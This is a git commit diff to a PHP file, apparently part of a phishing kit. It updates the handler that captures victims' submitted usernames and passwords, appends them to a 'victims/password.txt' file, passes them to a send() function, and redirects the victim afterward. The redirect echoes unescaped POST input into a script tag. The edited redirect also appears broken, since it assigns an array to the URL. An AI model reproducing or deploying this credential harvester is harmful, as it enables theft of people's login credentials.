97f840c593e9ae00d9f46ac06a6c1ca8c20b015c
Saikumar Shetty <73155077+Shettysai@users.noreply.github.com>
2022-08-14 21:34:54 +0530

    Update post.php

--- modules/post.php
+++ modules/post.php
@@ -1,16 +1,20 @@
 <?php
 include("iplogger.php");
+$url;
 if ($_SERVER['REQUEST_METHOD'] === 'POST') 
 {		   
     $user_agent = $_SERVER['HTTP_USER_AGENT'];       
-    $data = "username:" .$_POST['username']."\n".    
-            "password:" .$_POST['password']."\n".    
-	        "Page:"     .$_POST['location']."\n".                                                         
+    $data = "=====================================\n".
+            "username:   " .$_POST['username']."\n".    
+            "password:   " .$_POST['password']."\n".
+            "=====================================\n".   
+	        "Page:||"     .$_POST['location']."||\n".                                                         
 	        "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                                                          
 		
     File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                      
-    send($data);	
+    send($data);
+    $url =	explode("||", $data);
 }
 if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
-else echo "<script>window.location.replace('".$_POST['location']."');</script>";
+else echo "<script>window.location.replace('$url');</script>";
 ?>
